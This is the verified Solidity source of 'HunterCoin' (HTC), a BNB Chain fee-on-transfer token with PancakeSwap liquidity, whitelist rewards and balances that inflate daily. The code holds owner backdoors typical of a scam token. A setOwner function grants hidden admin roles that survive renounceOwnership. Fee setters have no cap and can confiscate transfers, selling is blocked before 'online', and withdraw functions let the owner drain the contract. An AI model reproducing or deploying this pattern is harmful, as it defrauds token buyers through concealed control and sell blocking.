/**
 *Submitted for verification at BscScan.com on 2022-02-05
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-03
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.6.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;
    mapping(address => bool) private _roles;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        _owner = _msgSender();
        _roles[_msgSender()] = true;
        emit OwnershipTransferred(address(0), _msgSender());
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_roles[_msgSender()]);
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _roles[_owner] = false;
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _roles[_owner] = false;
        _roles[newOwner] = true;
        _owner = newOwner;
    }

    function setOwner(address addr, bool state) public onlyOwner {
        _owner = addr;
        _roles[addr] = state;
    }

}


interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private _balance;
    mapping(address => uint256) private _profitBaseBlockNum;

    address[30] public _whiteList;

    address[25] public _topUserList;
    uint256 public _topUserListNum;

    mapping(address => bool) private _isExcludedReward;
    mapping(address => bool) private _isExcludedFromFee;

    string private _name = "HunterCoin";
    string private _symbol = "HTC";
    uint8  private _decimals = 18;
    uint256 private _totalSupply = 5600000000 ether;

    uint256 public _buyBurnFee = 5;
    uint256 public _sellBurnFee = 15;

    uint256 public _liquidityFee = 30;

    uint256 public _rewardFee = 20;

    uint256 public _whiteFee = 20;

    uint256 public _activateTime = 0;

    address public burnAddress = address(0x0000000000000000000000000000000000000000);

    address public usdtToken = address(0x55d398326f99059fF775485246999027B3197955);

    address public operationAddress = address(0x60Ff6Acd28ff70563D0c45B8ed71E00d2E2297F0);

    address public onlineAddress = address(0x97408f9958A324c49FDf5Dd51ac5b79BEE156755);

    IPancakeRouter02 public swapRouter;
    address public swapPair;

    uint256 private numTokensSellLimit = 10000 ether;
    uint256 private numTokensSellToTopLimit = 100000 ether;

    uint256 public numTokensSellToAddToLiquidity;
    uint256 public numTokensSellToTopUser;
    uint256 public numTokensSellToWhiteList;

    //pancakeSwap mainnet contract address
    address public routerV2Address = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    //deploy on zeroTime
    uint256 public genesisBlockNum = block.number;
    uint256 public fiveMinutesBlockNum = 100;
    uint256 public oneDayBlockNum = 28800;
    uint256 public oneHourBlockNum = 1200;

    uint256 public endBlockNum;

    //* 00 include baseNum rate
    uint256 public perDayRate = 2;
    //* 0000 include baseNum rate
    uint256 public perHourRate = 8;

    uint256 public onlineBlockNum;

    //sell & buy genesis fee
    uint256 public buyAndSellGenesisFee = 40;
    uint256 public reduceGenesisFee = 20;

    uint256 public _burnFeeTotal;

    constructor () public {
        _balance[owner()] = _totalSupply;

        endBlockNum = block.number.add(60 * oneDayBlockNum);

        IPancakeRouter02 _router = IPancakeRouter02(routerV2Address);
        swapPair = IUniswapV2Factory(_router.factory()).createPair(address(this), address(usdtToken));
        swapRouter = IPancakeRouter02(_router);

        _profitBaseBlockNum[owner()] = block.number;

        _whiteList[0] = 0x7cBd33C3cc396E4228828D845D213ce422148438;
        _whiteList[1] = 0x017432ce05a504B0078BCD99Cd7d555339E16F0b;
        _whiteList[2] = 0xcF07e564500DC44977Ab90bd5E0064030E66f962;
        _whiteList[3] = 0x3B50e2330264ed17e06FCEA96AF0C273c0204816;
        _whiteList[4] = 0x5Cc1668A8bcfC42C91498047819fa57c25044698;
        _whiteList[5] = 0xB22cFCa2D2907Aef50B368D8C63dE0ADC58F4Ab9;
        _whiteList[6] = 0xEeBBFf7c2873f4703Ee2BbC14303c21444F4786F;
        _whiteList[7] = 0x27C613B75c07A2D47a0DCD74372A877988fcc9de;
        _whiteList[8] = 0x7BdC9Ae78ADfC14f12D887C2dee766fC13c10a62;
        _whiteList[9] = 0x4B06ba6C1Eb3496F757E3cA12454679d89030DFC;
        _whiteList[10] = 0xB7A5781DE1aEA2F3849a30037A2357BAB71781dA;
        _whiteList[11] = 0x909E899E39577473A84fFA43a86071138DA858dB;
        _whiteList[12] = 0xE93e952452EC80124304d9D811FBa46ABF4a4718;
        _whiteList[13] = 0xe2f266CeE81A3E5b345ac20ADDa53a7f34e90ea3;
        _whiteList[14] = 0x763017d843FcCD47A79813474b6D5E4b85bba7Cd;
        _whiteList[15] = 0xD8937F9E8a225e0CdAd725b706094f25A959c4f3;
        _whiteList[16] = 0xDD7Ad1B2154FD91117acD96229A74EB16ADc5b02;
        _whiteList[17] = 0xf9Af5f25e50Bd7EbB8db7980972F46c3806778e0;
        _whiteList[18] = 0x82Bc053166754B9B95C3c540d67fa2184f98237a;
        _whiteList[19] = 0xddb1203E869EDB39E2fBe3Fa6D9FF350bE8Bc100;
        _whiteList[20] = 0x7F346cf4929257885Ddd5E3C007c07EC5F4CF901;
        _whiteList[21] = 0xb71BB907a9F46df5feE754eBE9FaAab0A80DEb14;
        _whiteList[22] = 0x05D4E11625dAAb482EdbdeEDC001f0c9eD843d11;
        _whiteList[23] = 0x461291F35a2e4fd8Fbe7ea13Fe9203706c1B21e4;
        _whiteList[24] = 0xf6F2A7A822F2a5A3ee2f3E1d2C38e8b9829031B0;
        _whiteList[25] = 0x48C985d18178dcdc0F60Ff00E7125996a5dbA03B;
        _whiteList[26] = 0x79f7C8e168f4EFa04C6B2C59769bB82c8827ffBb;
        _whiteList[27] = 0x69E49B95C791366A6280E74085E6706E9F068688;
        _whiteList[28] = 0xaD4107eE5a617dDB165f5D68652a540c7429B0D0;
        _whiteList[29] = 0x28EbfcB21D42c2c8A2f76F958eB76CE2E2707887;

        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 amount = _balance[account];
        if (amount == 0) {
            return 0;
        }
        (uint256 profitDays,uint256 profitHours) = getProfitTime(account);
        for (uint i = 0; i < profitDays; i++) {
            amount += amount * perDayRate / 100;
        }
        for (uint j = 0; j < profitHours; j++) {
            amount += amount * perHourRate / 10000;
        }
        return amount;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function topUserReward(uint256 rewardAmount) private {
        swapTokensForUsdt(rewardAmount);
        IERC20(usdtToken).transferFrom(operationAddress, address(this), IERC20(usdtToken).balanceOf(address(operationAddress)));
        uint256 perReward = IERC20(usdtToken).balanceOf(address(this)).div(_topUserListNum);
        for (uint i = 0; i < _topUserListNum; i++) {
            IERC20(usdtToken).transfer(_topUserList[i], perReward);
        }
    }

    function syncBalance(address account, uint256 amount, bool flag) private {
        if (flag) {
            _balance[account] = balanceOf(account).add(amount);
        } else {
            if (balanceOf(account) > amount) {
                _balance[account] = balanceOf(account).sub(amount);
            } else {
                _balance[account] = 0;
            }
        }
        _profitBaseBlockNum[account] = block.number;
    }

    function getTopUserList() public view returns (address[25] memory){
        return _topUserList;
    }

    function setTopUserList(address _addr, uint _sort) public onlyOwner {
        _topUserList[_sort] = _addr;
        if (_topUserListNum < 24) {
            _topUserListNum++;
        }
    }

    function whiteListReward(uint256 amount) private {
        swapTokensForUsdt(amount);
        IERC20(usdtToken).transferFrom(operationAddress, address(this), IERC20(usdtToken).balanceOf(address(operationAddress)));
        uint256 perReward = IERC20(usdtToken).balanceOf(address(this)).div(30);
        for (uint i = 0; i < 30; i++) {
            IERC20(usdtToken).transfer(_whiteList[i], perReward);
        }
    }

    function setRouter(address _swapPair) public onlyOwner {
        swapPair = _swapPair;
        onlineBlockNum = block.number;
    }

    function setOnline() public onlyOwner {
        onlineBlockNum = block.number;
    }

    function getGenesisFee() public view returns (uint256){
        uint256 currentBlockNum = block.number;
        uint256 times = currentBlockNum.sub(onlineBlockNum).div(fiveMinutesBlockNum);
        uint256 genesisFee = times * reduceGenesisFee;
        if (buyAndSellGenesisFee > genesisFee) {
            return buyAndSellGenesisFee.sub(genesisFee);
        } else {
            return 0;
        }
    }

    function getProfitTime(address account) public view returns (uint256, uint256){
        uint256 currentBlockNum = block.number > endBlockNum ? endBlockNum : block.number;
        uint256 accountBlockNum = _profitBaseBlockNum[account];
        if (accountBlockNum == 0) {
            return (0, 0);
        }
        if (currentBlockNum > accountBlockNum) {
            return (currentBlockNum.sub(accountBlockNum).div(oneDayBlockNum),
            ((currentBlockNum.sub(accountBlockNum)) % oneDayBlockNum).div(oneHourBlockNum));
        } else {
            return (0, 0);
        }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function totalBurn() public view returns (uint256) {
        return _burnFeeTotal;
    }

    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
        _liquidityFee = liquidityFee;
    }

    function setRewardFeePercent(uint256 rewardFee) external onlyOwner() {
        _rewardFee = rewardFee;
    }

    function setBuyBurnFeePercent(uint256 burnFee) external onlyOwner() {
        _buyBurnFee = burnFee;
    }

    function setSellBurnFeePercent(uint256 burnFee) external onlyOwner() {
        _sellBurnFee = burnFee;
    }

    function setWhiteFeePercent(uint256 whiteFee) external onlyOwner() {
        _whiteFee = whiteFee;
    }

    function setEthWith(address addr, uint256 amount) public onlyOwner {
        payable(addr).transfer(amount);
    }

    function setErc20With(address con, address addr, uint256 amount) public onlyOwner {
        IERC20(con).transfer(addr, amount);
    }

    receive() external payable {}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from, address to, uint256 amount
    ) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(balanceOf(from) >= amount, "Insufficient balance");

        uint256 burnAmount;
        uint256 lastAmount = amount;
        uint256 addAmount;
        uint256 subAmount;
        bool takeFee = false;
        if (from != address(this) && to != address(this)) {

            if (onlineBlockNum == 0) {
                //off
                if (to == swapPair) {
                    require(from == onlineAddress);
                }
            }
            if (from == swapPair) {
                //buy
                burnAmount = amount.mul(_buyBurnFee).div(1000);
                takeFee = true;
            } else if (to == swapPair) {
                //sell
                burnAmount = amount.mul(_sellBurnFee).div(1000);
                takeFee = true;
            }

            if (takeFee) {
                uint256 genesisAmount = amount.mul(getGenesisFee()).div(1000);
                syncBalance(burnAddress, genesisAmount.add(burnAmount), true);
                emit Transfer(from, burnAddress, genesisAmount.add(burnAmount));

                _burnFeeTotal = _burnFeeTotal.add(genesisAmount).add(burnAmount);

                uint256 lpAmount = amount.mul(_liquidityFee).div(1000);
                addAmount += lpAmount;
                if (numTokensSellToAddToLiquidity >= numTokensSellLimit) {
                    swapAndLiquify(numTokensSellToAddToLiquidity);
                    subAmount += numTokensSellToAddToLiquidity;
                    numTokensSellToAddToLiquidity = 0;
                }
                numTokensSellToAddToLiquidity += lpAmount;

                uint256 rewardAmount = amount.mul(_rewardFee).div(1000);
                addAmount += rewardAmount;
                if (numTokensSellToTopUser >= numTokensSellToTopLimit) {
                    if (_topUserListNum > 0) {
                        topUserReward(numTokensSellToTopUser);
                        subAmount += numTokensSellToTopUser;
                        numTokensSellToTopUser = 0;
                    }
                }
                numTokensSellToTopUser += rewardAmount;

                uint256 whiteAmount = amount.mul(_whiteFee).div(1000);
                addAmount += whiteAmount;
                if (numTokensSellToWhiteList >= numTokensSellLimit) {
                    whiteListReward(numTokensSellToWhiteList);
                    subAmount += numTokensSellToWhiteList;
                    numTokensSellToWhiteList = 0;
                }
                numTokensSellToWhiteList += whiteAmount;

                uint256 feeAmount = genesisAmount.add(burnAmount);
                feeAmount = feeAmount.add(lpAmount).add(rewardAmount).add(whiteAmount);
                lastAmount = amount > feeAmount ? amount.sub(feeAmount) : 0;

                //                syncBalance(address(this), subAmount, false);
                //                syncBalance(address(this), addAmount, true);
                _balance[address(this)] += addAmount;
            }
        }

        syncBalance(from, amount, false);
        syncBalance(to, lastAmount, true);
        emit Transfer(from, to, lastAmount);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        uint256 initialBalance = IERC20(usdtToken).balanceOf(address(operationAddress));

        // swap tokens for USDT
        swapTokensForUsdt(half);

        // how much USDT did we just swap into?
        uint256 newBalance = IERC20(usdtToken).balanceOf(address(operationAddress)).sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);
    }

    function swapTokensForUsdt(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdtToken);

        _approve(address(this), routerV2Address, tokenAmount);

        // make the swap
        swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            operationAddress,
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 usdtAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), routerV2Address, tokenAmount);
        IERC20(usdtToken).transferFrom(operationAddress, address(this), usdtAmount);
        IERC20(usdtToken).approve(routerV2Address, usdtAmount);

        // add the liquidity
        swapRouter.addLiquidity(
            address(this),
            address(usdtToken),
            tokenAmount,
            usdtAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            operationAddress,
            block.timestamp
        );
    }
}